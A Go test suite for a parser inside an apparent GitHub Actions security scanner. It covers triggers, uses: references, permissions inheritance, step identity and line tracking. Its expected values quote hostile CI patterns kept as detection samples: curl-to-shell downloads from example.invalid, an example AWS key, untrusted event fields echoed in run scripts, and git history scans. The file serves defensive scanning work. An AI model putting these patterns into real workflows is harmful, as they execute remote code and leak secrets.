package parse_test

import (
	"bytes"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/Vibrouz/whoa/internal/parse"
)

const fixtureDir = "../../tests/fixtures/parse"

func fixture(t *testing.T, name string) []byte {
	t.Helper()
	data, err := os.ReadFile(filepath.Join(fixtureDir, name))
	if err != nil {
		t.Fatalf("read fixture %s: %v", name, err)
	}
	return data
}

func parseFixture(t *testing.T, name string) (*parse.File, []byte) {
	t.Helper()
	data := fixture(t, name)
	path := filepath.Join(".github/workflows", name)
	file, err := parse.ParseFile(path, data)
	if err != nil {
		t.Fatalf("parse %s: %v", name, err)
	}
	return file, data
}

// lineOf returns the 1-based line of the first occurrence of substr, counted
// from the raw file bytes rather than from the parsed tree. Assertions about
// line numbers have to be measured against the file on disk, or they are just
// asserting that the parser agrees with itself.
func lineOf(t *testing.T, data []byte, substr string) int {
	t.Helper()
	idx := bytes.Index(data, []byte(substr))
	if idx < 0 {
		t.Fatalf("fixture does not contain %q", substr)
	}
	return 1 + bytes.Count(data[:idx], []byte("\n"))
}

// A workflow with no on: block parses cleanly against a broken parser, so the
// on: block has to be read from a fixture that has one.
func TestTriggersFromRealOnBlock(t *testing.T) {
	file, _ := parseFixture(t, "triggers.yml")

	if !file.Triggers.Present {
		t.Fatal("Triggers.Present is false: the on: block was dropped, so every trigger rule would silently never fire")
	}

	want := []string{"pull_request_target", "push", "schedule", "workflow_call", "workflow_dispatch"}
	if got := file.Triggers.Events(); !slices.Equal(got, want) {
		t.Errorf("Events() = %v, want %v", got, want)
	}

	push, ok := file.Triggers.Spec("push")
	if !ok {
		t.Fatal("push trigger not found")
	}
	if !slices.Equal(push.Branches, []string{"main"}) {
		t.Errorf("push branches = %v, want [main]", push.Branches)
	}
	if push.Unfiltered() {
		t.Error("push has a branches filter, so Unfiltered() should be false")
	}

	target, ok := file.Triggers.Spec("pull_request_target")
	if !ok {
		t.Fatal("pull_request_target trigger not found")
	}
	if !slices.Equal(target.Types, []string{"opened", "synchronize"}) {
		t.Errorf("pull_request_target types = %v, want [opened synchronize]", target.Types)
	}

	dispatch, ok := file.Triggers.Spec("workflow_dispatch")
	if !ok {
		t.Fatal("workflow_dispatch trigger not found")
	}
	if !dispatch.Unfiltered() {
		t.Error("workflow_dispatch has no ref filter, so Unfiltered() should be true")
	}

	// workflow_call carries an inputs mapping that is not a filter. Reading it
	// as one would leave the trigger looking filtered, or fail to parse at all.
	call, ok := file.Triggers.Spec("workflow_call")
	if !ok {
		t.Fatal("workflow_call trigger not found")
	}
	if len(call.Branches) != 0 || len(call.Types) != 0 {
		t.Errorf("workflow_call picked up filters from its inputs: %+v", call)
	}
}

// The three ways GitHub accepts an on: block have to produce the same
// triggers, because a rule reading triggers has no business knowing which
// syntax the author chose.
func TestTriggerFormsAreEquivalent(t *testing.T) {
	tests := []struct {
		fixture string
		events  []string
	}{
		{"triggers-scalar.yml", []string{"push"}},
		{"triggers-list.yml", []string{"pull_request", "push"}},
		{"triggers.yml", []string{"pull_request_target", "push", "schedule", "workflow_call", "workflow_dispatch"}},
	}

	for _, tt := range tests {
		t.Run(tt.fixture, func(t *testing.T) {
			file, _ := parseFixture(t, tt.fixture)
			if !file.Triggers.Present {
				t.Fatal("Triggers.Present is false")
			}
			if got := file.Triggers.Events(); !slices.Equal(got, tt.events) {
				t.Errorf("Events() = %v, want %v", got, tt.events)
			}
			if !file.Triggers.Has("push") {
				t.Error("Has(push) = false")
			}
		})
	}
}

// Unfiltered decides whether rule 7 fires, so every filter shape has a case.
// A workflow has one on: block, which is why these are inline rather than
// fixtures.
func TestTriggerSpecUnfiltered(t *testing.T) {
	tests := []struct {
		name       string
		on         string
		unfiltered bool
	}{
		{"no filters", "on:\n  push:", true},
		{"branches", "on:\n  push:\n    branches: [main]", false},
		{"branches-ignore", "on:\n  push:\n    branches-ignore: ['wip/**']", false},
		{"tags", "on:\n  push:\n    tags: ['v*']", false},
		{"tags-ignore", "on:\n  push:\n    tags-ignore: ['n/**']", false},
		{"paths", "on:\n  push:\n    paths: ['src/**']", false},
		{"paths-ignore", "on:\n  push:\n    paths-ignore: ['docs/**']", false},
		{"empty branches list filters nothing", "on:\n  push:\n    branches: []", true},
		{"a types filter is not a ref filter", "on:\n  pull_request_target:\n    types: [opened]", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			file, err := parse.Parse([]byte(tt.on + "\n"))
			if err != nil {
				t.Fatalf("Parse: %v", err)
			}
			for _, spec := range file.Triggers.Specs {
				if got := spec.Unfiltered(); got != tt.unfiltered {
					t.Errorf("%s.Unfiltered() = %v, want %v", spec.Event, got, tt.unfiltered)
				}
			}
		})
	}
}

func TestTriggersAbsent(t *testing.T) {
	file, err := parse.Parse([]byte("jobs:\n  build:\n    steps:\n      - run: echo hi\n"))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if file.Triggers.Present {
		t.Error("Triggers.Present = true for a workflow with no on: block")
	}
	if file.Triggers.Has("push") {
		t.Error("Has(push) = true for a workflow with no on: block")
	}
}

// uses: appears at three locations. A step-only walk misses reusable workflow
// calls, which are the more dangerous case because the jobs run in a repository
// ppe does not scan.
func TestUsesAtAllThreeLocations(t *testing.T) {
	file, _ := parseFixture(t, "uses-locations.yml")

	t.Run("workflow level", func(t *testing.T) {
		if len(file.Uses) != 1 {
			t.Fatalf("workflow level uses: count = %d, want 1", len(file.Uses))
		}
		repo, subpath, ref := file.Uses[0].Parts()
		if repo != "example/ci" || subpath != ".github/workflows/reusable.yml" || ref != "main" {
			t.Errorf("Parts() = (%q, %q, %q), want (example/ci, .github/workflows/reusable.yml, main)", repo, subpath, ref)
		}
	})

	t.Run("job level", func(t *testing.T) {
		job, ok := file.Job("call-reusable")
		if !ok {
			t.Fatal("job call-reusable not found")
		}
		if job.Uses == nil {
			t.Fatal("job level uses: not parsed: a reusable workflow call is the case a step-only walk misses")
		}
		repo, subpath, ref := job.Uses.Parts()
		if repo != "other-org/infra" {
			t.Errorf("repo = %q, want other-org/infra", repo)
		}
		if subpath != ".github/workflows/build.yml" {
			t.Errorf("subpath = %q, want .github/workflows/build.yml", subpath)
		}
		if len(ref) != 40 {
			t.Errorf("ref = %q, want a 40 character commit SHA", ref)
		}
		if target, ok := job.With.Get("target"); !ok || target.Text != "staging" {
			t.Errorf("job with: target = %+v, want staging", target)
		}
	})

	t.Run("step level", func(t *testing.T) {
		job, ok := file.Job("action-steps")
		if !ok {
			t.Fatal("job action-steps not found")
		}
		if len(job.Steps) != 4 {
			t.Fatalf("step count = %d, want 4", len(job.Steps))
		}
		for _, step := range job.Steps {
			if step.Uses == nil {
				t.Errorf("step %d has no uses", step.Number)
			}
		}

		_, _, ref := job.Steps[0].Uses.Parts()
		if ref != "v4" {
			t.Errorf("actions/checkout ref = %q, want v4", ref)
		}
		_, _, ref = job.Steps[1].Uses.Parts()
		if len(ref) != 40 {
			t.Errorf("actions/setup-node ref = %q, want a 40 character commit SHA", ref)
		}
		if !job.Steps[2].Uses.IsLocal() {
			t.Errorf("%q should be a local action", job.Steps[2].Uses.Target)
		}
		if repo, _, _ := job.Steps[3].Uses.Parts(); repo != "docker://alpine:3.19" {
			t.Errorf("container action repo = %q, want docker://alpine:3.19", repo)
		}
	})
}

func TestUsesParts(t *testing.T) {
	tests := []struct {
		target  string
		repo    string
		subpath string
		ref     string
	}{
		{"actions/checkout@v4", "actions/checkout", "", "v4"},
		{"actions/checkout", "actions/checkout", "", ""},
		{"org/repo/.github/workflows/build.yml@main", "org/repo", ".github/workflows/build.yml", "main"},
		{"org/repo/path/to/action@sha256:0123456789abcdef", "org/repo", "path/to/action", "sha256:0123456789abcdef"},
		{"./.github/actions/build", "", "./.github/actions/build", ""},
		{"docker://alpine:3.19", "docker://alpine:3.19", "", ""},
		{"owner/repo@release/v1", "owner/repo", "", "release/v1"},
	}

	for _, tt := range tests {
		t.Run(tt.target, func(t *testing.T) {
			repo, subpath, ref := parse.UsesRef{Target: tt.target}.Parts()
			if repo != tt.repo || subpath != tt.subpath || ref != tt.ref {
				t.Errorf("Parts() = (%q, %q, %q), want (%q, %q, %q)", repo, subpath, ref, tt.repo, tt.subpath, tt.ref)
			}
		})
	}
}

// run: is a block scalar as often as it is a single line. Rules match the
// resolved value, so the parser has to hand them one string with the lines
// already joined.
func TestRunIsResolvedNotReadLineByLine(t *testing.T) {
	file, data := parseFixture(t, "run-block-scalars.yml")

	job, ok := file.Job("build")
	if !ok {
		t.Fatal("job build not found")
	}
	if len(job.Steps) != 6 {
		t.Fatalf("step count = %d, want 6", len(job.Steps))
	}

	literal := job.Steps[0]
	want := strings.Join([]string{
		"set -euo pipefail",
		"export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE",
		`echo "title is ${{ github.event.pull_request.title }}"`,
		"git log -p -n 50 > /tmp/history.txt",
		"",
	}, "\n")
	if literal.Run != want {
		t.Errorf("block scalar not resolved:\n got %q\nwant %q", literal.Run, want)
	}
	if literal.RunLine != lineOf(t, data, "set -euo pipefail") {
		t.Errorf("RunLine = %d, want %d: a finding inside the script should point at the script, not at the run: key", literal.RunLine, lineOf(t, data, "set -euo pipefail"))
	}

	// The credential pattern the rules match on is only reachable because the
	// block scalar was joined rather than read a line at a time.
	if !strings.Contains(literal.Run, "AKIAIOSFODNN7EXAMPLE") {
		t.Error("resolved run does not contain the credential pattern the rules match on")
	}

	stripped := job.Steps[1]
	if strings.HasSuffix(stripped.Run, "\n") {
		t.Errorf("run |- should not end in a newline, got %q", stripped.Run)
	}
	if !strings.Contains(stripped.Run, "curl https://example.invalid/install.sh | bash") {
		t.Errorf("run |- not resolved: %q", stripped.Run)
	}

	folded := job.Steps[2]
	if folded.Run != "echo one echo two\n" {
		t.Errorf("folded run = %q, want %q", folded.Run, "echo one echo two\n")
	}

	if got := job.Steps[3].Run; got != "curl https://example.invalid/payload | sh" {
		t.Errorf("single line run = %q", got)
	}
	if got := job.Steps[4].Run; got != `echo "${{ github.event.issue.body }}"` {
		t.Errorf("quoted run = %q", got)
	}
	if got := job.Steps[5].Run; got != "" {
		t.Errorf("empty run = %q, want empty", got)
	}
}

// A rule that matched inside a multi line script has to be able to say which
// line matched, or every finding in a block scalar points at the run: key.
func TestRunLineAt(t *testing.T) {
	file, data := parseFixture(t, "run-block-scalars.yml")
	build, ok := file.Job("build")
	if !ok {
		t.Fatal("job build not found")
	}
	step := build.Steps[0]

	tests := []struct {
		needle string
	}{
		{"set -euo pipefail"},
		{"export AWS_ACCESS_KEY_ID"},
		{"github.event.pull_request.title"},
		{"git log -p -n 50"},
	}

	for _, tt := range tests {
		t.Run(tt.needle, func(t *testing.T) {
			idx := strings.Index(step.Run, tt.needle)
			if idx < 0 {
				t.Fatalf("run does not contain %q", tt.needle)
			}
			got := step.RunLineAt(idx)
			if want := lineOf(t, data, tt.needle); got != want {
				t.Errorf("RunLineAt(%d) = %d, want %d", idx, got, want)
			}
		})
	}

	if got := step.RunLineAt(len(step.Run) + 100); got != step.RunLine {
		t.Errorf("RunLineAt out of range = %d, want %d", got, step.RunLine)
	}
}

// permissions: at job level is inherited from the workflow when the job does
// not declare its own. Treating a missing job block as unrestricted warns on
// every correctly scoped repository.
func TestPermissionsInheritance(t *testing.T) {
	file, data := parseFixture(t, "permissions.yml")

	if file.Permissions == nil {
		t.Fatal("workflow level permissions not parsed")
	}
	if file.Permissions.Scope != parse.PermissionWriteAll {
		t.Errorf("workflow scope = %q, want %q", file.Permissions.Scope, parse.PermissionWriteAll)
	}
	if file.Permissions.Level != parse.PermissionLevelWorkflow {
		t.Errorf("workflow level = %q, want %q", file.Permissions.Level, parse.PermissionLevelWorkflow)
	}
	if file.Permissions.Line != lineOf(t, data, "permissions: write-all") {
		t.Errorf("workflow permissions line = %d, want %d", file.Permissions.Line, lineOf(t, data, "permissions: write-all"))
	}

	t.Run("job with its own block", func(t *testing.T) {
		job, _ := file.Job("inherits-read-all")
		if job.Permissions == nil {
			t.Fatal("job permissions not parsed")
		}
		if job.Permissions.Scope != parse.PermissionReadAll {
			t.Errorf("scope = %q, want %q", job.Permissions.Scope, parse.PermissionReadAll)
		}
		if job.Permissions.Level != parse.PermissionLevelJob {
			t.Errorf("level = %q, want %q", job.Permissions.Level, parse.PermissionLevelJob)
		}
	})

	t.Run("job inheriting the workflow block", func(t *testing.T) {
		job, _ := file.Job("inherits-workflow-write-all")
		if job.Permissions != nil {
			t.Error("job declares its own permissions block; the fixture is wrong")
		}
		got, ok := file.PermissionsFor(job.ID)
		if !ok {
			t.Fatal("PermissionsFor() reported no block, but the workflow declares one")
		}
		if got.Scope != parse.PermissionWriteAll {
			t.Errorf("inherited scope = %q, want %q", got.Scope, parse.PermissionWriteAll)
		}
		if got.Level != parse.PermissionLevelWorkflow {
			t.Errorf("inherited level = %q, want %q: a finding has to be able to say where the block came from", got.Level, parse.PermissionLevelWorkflow)
		}
		if !got.Grants("contents") {
			t.Error("a workflow level write-all should grant contents at write level")
		}
	})

	t.Run("explicit map", func(t *testing.T) {
		job, _ := file.Job("explicit-map")
		if job.Permissions == nil || job.Permissions.Scope != parse.PermissionMap {
			t.Fatalf("explicit permissions map not parsed: %+v", job.Permissions)
		}
		if !job.Permissions.Grants("id-token") {
			t.Error("Grants(id-token) = false, want true")
		}
		if job.Permissions.Grants("contents") {
			t.Error("Grants(contents) = true, want false: contents is read in this block")
		}
		if job.Permissions.Grants("packages") {
			t.Error("Grants(packages) = true, want false: it is not listed")
		}
	})

	t.Run("key present but empty", func(t *testing.T) {
		job, _ := file.Job("empty-block")
		if job.Permissions == nil {
			t.Fatal("an empty permissions key should still be a declared block")
		}
		if !job.Permissions.Declared {
			t.Error("Declared = false for a permissions key that is present")
		}
		if job.Permissions.Scope != parse.PermissionUnspecified {
			t.Errorf("scope = %q, want %q", job.Permissions.Scope, parse.PermissionUnspecified)
		}
		if job.Permissions.Grants("contents") {
			t.Error("an unspecified block grants nothing on its face: the repository default decides, and rules resolve that")
		}
	})

	t.Run("nothing declared anywhere", func(t *testing.T) {
		other, _ := parseFixture(t, "jobs-steps.yml")
		if other.Permissions != nil {
			t.Error("workflow permissions should be nil")
		}
		if _, ok := other.PermissionsFor("harvest"); ok {
			t.Error("PermissionsFor() reported a block when neither level declares one")
		}
	})
}

// Steps belong to jobs, and the grouping is what decides whether two signals are
// in the same job or merely in the same file.
func TestStepsAreGroupedPerJob(t *testing.T) {
	file, _ := parseFixture(t, "jobs-steps.yml")

	wantJobs := []string{"harvest", "report", "unrelated"}
	gotJobs := make([]string, 0, len(file.Jobs))
	for _, job := range file.Jobs {
		gotJobs = append(gotJobs, job.ID)
	}
	if !slices.Equal(gotJobs, wantJobs) {
		t.Fatalf("job order = %v, want %v: a map would have lost document order", gotJobs, wantJobs)
	}

	// This is the rule 6 shape: fetch-depth: 0 and a history scan correlate
	// per job, then per file.
	type jobShape struct {
		fetchDepth0 bool
		historyScan bool
	}
	shapes := map[string]jobShape{}
	for _, job := range file.Jobs {
		shape := jobShape{}
		for _, step := range job.Steps {
			if depth, ok := step.With.Get("fetch-depth"); ok && depth.Text == "0" {
				shape.fetchDepth0 = true
			}
			if strings.Contains(step.Run, "git log -p") {
				shape.historyScan = true
			}
		}
		shapes[job.ID] = shape
	}

	want := map[string]jobShape{
		"harvest":   {fetchDepth0: true, historyScan: true},
		"report":    {fetchDepth0: false, historyScan: true},
		"unrelated": {fetchDepth0: false, historyScan: false},
	}
	for id, wantShape := range want {
		if shapes[id] != wantShape {
			t.Errorf("job %s = %+v, want %+v", id, shapes[id], wantShape)
		}
	}
}

func TestJobAndStepIdentity(t *testing.T) {
	file, data := parseFixture(t, "jobs-steps.yml")

	job, ok := file.Job("harvest")
	if !ok {
		t.Fatal("job harvest not found")
	}
	if job.Line != lineOf(t, data, "harvest:") {
		t.Errorf("job line = %d, want %d", job.Line, lineOf(t, data, "harvest:"))
	}

	first := job.Steps[0]
	if first.Index != 0 || first.Number != 1 {
		t.Errorf("first step index/number = %d/%d, want 0/1", first.Index, first.Number)
	}
	if first.ID != "harvest/step/1" {
		t.Errorf("first step ID = %q, want harvest/step/1", first.ID)
	}

	named := job.Steps[1]
	if named.Name != "scan history" {
		t.Errorf("step name = %q, want %q", named.Name, "scan history")
	}
	if named.ID != "harvest/step/2" {
		t.Errorf("step ID = %q, want harvest/step/2", named.ID)
	}
	if named.NameLine != lineOf(t, data, "name: scan history") {
		t.Errorf("step name line = %d, want %d", named.NameLine, lineOf(t, data, "name: scan history"))
	}
}

// Step identity has to survive a rename: a finding that changes ID when someone
// edits a step name cannot be suppressed or tracked across commits.
func TestStepIdentityIsStableUnderRename(t *testing.T) {
	before := `
jobs:
  build:
    steps:
      - name: old name
        run: echo hi
`
	after := `
jobs:
  build:
    steps:
      - name: a completely different name
        run: echo hi
`

	ids := func(src string) string {
		file, err := parse.Parse([]byte(src))
		if err != nil {
			t.Fatalf("Parse: %v", err)
		}
		return file.Jobs[0].Steps[0].ID
	}
	if a, b := ids(before), ids(after); a != b {
		t.Errorf("step ID changed with the step name: %q then %q", a, b)
	}
}

// Values are compared as text, never converted to another type, so that a step
// comparing an input against a literal compares what the author wrote.
func TestValueTextIsNotTypeConverted(t *testing.T) {
	file, _ := parseFixture(t, "uses-locations.yml")

	job, _ := file.Job("action-steps")
	depth, ok := job.Steps[0].With.Get("fetch-depth")
	if !ok {
		t.Fatal("fetch-depth input not found")
	}
	if depth.Text != "0" {
		t.Errorf("fetch-depth = %q, want %q", depth.Text, "0")
	}

	node, _ := job.Steps[1].With.Get("node-version")
	if node.Text != "20" {
		t.Errorf("node-version = %q, want %q", node.Text, "20")
	}
}

func TestValuesOrderAndLookup(t *testing.T) {
	file, _ := parseFixture(t, "permissions.yml")
	job, _ := file.Job("explicit-map")

	var got []string
	for _, entry := range job.Permissions.Values {
		got = append(got, entry.Name+"="+entry.Text)
	}
	want := []string{"contents=read", "id-token=write"}
	if !slices.Equal(got, want) {
		t.Errorf("values = %v, want %v: order has to come from the file, not from map iteration", got, want)
	}

	if _, ok := job.Permissions.Values.Get("nope"); ok {
		t.Error("Get(nope) found an entry that is not there")
	}
	if job.Permissions.Values.Has("contents") != true {
		t.Error("Has(contents) = false")
	}
	if job.Permissions.Values.Len() != 2 {
		t.Errorf("Len() = %d, want 2", job.Permissions.Values.Len())
	}
}

func TestRunsOnShapes(t *testing.T) {
	file, err := parse.Parse([]byte(`jobs:
  scalar:
    runs-on: ubuntu-latest
    steps: []
  list:
    runs-on: [self-hosted, linux]
    steps: []
  matrix:
    runs-on:
      group: ubuntu-runners
      os: [ubuntu-latest, ubuntu-24.04]
    steps: []
`))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}

	scalar, _ := file.Job("scalar")
	if scalar.RunsOn.Scalar != "ubuntu-latest" {
		t.Errorf("scalar runs-on = %q", scalar.RunsOn.Scalar)
	}
	list, _ := file.Job("list")
	if !slices.Equal(list.RunsOn.List, []string{"self-hosted", "linux"}) {
		t.Errorf("list runs-on = %v", list.RunsOn.List)
	}
	matrix, _ := file.Job("matrix")
	if group, ok := matrix.RunsOn.Matrix.Get("group"); !ok || group.Text != "ubuntu-runners" {
		t.Errorf("matrix group = %+v, want ubuntu-runners", group)
	}
	os, ok := matrix.RunsOn.Matrix.Get("os")
	if !ok {
		t.Fatal("matrix os entry not found")
	}
	if !slices.Equal(os.List, []string{"ubuntu-latest", "ubuntu-24.04"}) {
		t.Errorf("matrix os = %v, want [ubuntu-latest ubuntu-24.04]: a version list inside a matrix is ordinary workflow YAML", os.List)
	}
}

// Windows contributors commit CRLF line endings, and the run script is
// normalized either way, but the line numbers have to stay right or every
// finding points at the wrong line on their repositories.
func TestCRLFWorkflow(t *testing.T) {
	data := bytes.ReplaceAll(fixture(t, "run-block-scalars.yml"), []byte("\n"), []byte("\r\n"))
	file, err := parse.ParseFile(".github/workflows/ci.yml", data)
	if err != nil {
		t.Fatalf("ParseFile: %v", err)
	}

	step := file.Jobs[0].Steps[0]
	if strings.Contains(step.Run, "\r") {
		t.Errorf("run still contains carriage returns: %q", step.Run)
	}
	if !strings.Contains(step.Run, "AKIAIOSFODNN7EXAMPLE") {
		t.Error("block scalar not resolved on a CRLF file")
	}
	idx := strings.Index(step.Run, "git log -p")
	if got, want := step.RunLineAt(idx), lineOf(t, data, "git log -p"); got != want {
		t.Errorf("RunLineAt = %d, want %d on a CRLF file", got, want)
	}
}

func TestUnknownKeysAreIgnored(t *testing.T) {
	// Keys ppe does not read must not stop a workflow parsing: a repository
	// using a feature this version has not heard of should still get scanned
	// for the features it does understand.
	file, err := parse.Parse([]byte(`run-name: build by ${{ github.actor }}
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: true
defaults:
  run:
    shell: bash
permissions: read-all
env:
  NODE_ENV: production
jobs:
  build:
    needs: [lint]
    strategy:
      matrix:
        node: [18, 20]
    container:
      image: node:20
    services:
      redis:
        image: redis
    concurrency:
      group: build-${{ github.ref }}
    secrets: inherit
    outputs:
      sha: ${{ github.sha }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: true
      - run: echo hi
        working-directory: ./sub
`))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if len(file.Jobs) != 1 || len(file.Jobs[0].Steps) != 2 {
		t.Fatalf("jobs/steps = %d/%d, want 1/2", len(file.Jobs), len(file.Jobs[0].Steps))
	}
	if env, ok := file.Env.Get("NODE_ENV"); !ok || env.Text != "production" {
		t.Errorf("workflow env = %+v, want NODE_ENV=production", file.Env)
	}
}

func TestParseSetsPathAndRepository(t *testing.T) {
	data := []byte("jobs:\n  build:\n    steps: []\n")

	plain, err := parse.Parse(data)
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if plain.Path != "" {
		t.Errorf("Parse set Path = %q, want empty", plain.Path)
	}
	if !plain.Repository.IsZero() {
		t.Errorf("Parse set Repository = %q, want zero", plain.Repository)
	}

	named, err := parse.ParseWorkflow(".github/workflows/ci.yml", parse.Repository{Owner: "acme", Name: "web"}, data)
	if err != nil {
		t.Fatalf("ParseWorkflow: %v", err)
	}
	if named.Path != ".github/workflows/ci.yml" {
		t.Errorf("Path = %q", named.Path)
	}
	if got := named.Repository.String(); got != "acme/web" {
		t.Errorf("Repository = %q, want acme/web: rule 10 compares references against it", got)
	}
}

func TestJobOrderIsDocumentOrder(t *testing.T) {
	file, err := parse.Parse([]byte(`jobs:
  zebra:
    steps: []
  apple:
    steps: []
  middle:
    steps: []
`))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	want := []string{"zebra", "apple", "middle"}
	var got []string
	for _, job := range file.Jobs {
		got = append(got, job.ID)
	}
	if !slices.Equal(got, want) {
		t.Errorf("job order = %v, want %v", got, want)
	}
}

func TestNullAndEmptyStructures(t *testing.T) {
	file, err := parse.Parse([]byte("on:\npermissions:\njobs:\n  empty:\n  withsteps:\n    steps:\n"))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	if file.Triggers.Present != true || len(file.Triggers.Specs) != 0 {
		t.Errorf("empty on: = %+v", file.Triggers)
	}
	if file.Permissions == nil || file.Permissions.Scope != parse.PermissionUnspecified {
		t.Errorf("empty permissions: = %+v", file.Permissions)
	}
	if len(file.Jobs) != 2 {
		t.Fatalf("jobs = %d, want 2", len(file.Jobs))
	}
	empty, _ := file.Job("empty")
	if len(empty.Steps) != 0 {
		t.Errorf("job with no keys = %+v", empty)
	}
}

func TestJobWithoutSteps(t *testing.T) {
	file, err := parse.Parse([]byte("jobs:\n  reusable:\n    uses: other/repo/.github/workflows/build.yml@main\n"))
	if err != nil {
		t.Fatalf("Parse: %v", err)
	}
	job, ok := file.Job("reusable")
	if !ok {
		t.Fatal("job reusable not found")
	}
	if job.Uses == nil {
		t.Fatal("jobs.<id>.uses not parsed")
	}
	if len(job.Steps) != 0 {
		t.Errorf("reusable workflow call has %d steps, want 0", len(job.Steps))
	}
}
